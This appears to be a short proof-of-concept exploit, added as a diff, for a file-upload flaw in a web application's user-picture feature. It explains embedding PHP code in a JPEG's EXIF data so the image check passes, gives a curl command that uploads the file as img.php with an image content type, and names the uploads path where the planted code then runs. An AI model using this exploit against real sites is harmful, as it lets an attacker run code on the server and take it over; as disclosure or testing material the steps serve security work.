@@ -1,0 +1,11 @@
+Get a JPEG file, open it in a hex editor, add some PHP inside the EXIF 
+data or
+in similar places.  Make sure PHP's getimagesize() does not return false 
+and
+that the file does not throw parse errors or the like when fed to PHP.  
+Then:
+
+curl -F 'file=@img.php;type=image/jpeg' 
+'http://<dzcp>/upload/index.php?action=userpic&do=upload'
+
+Then check http://<dzcp>/inc/images/uploads/userpics/.php 
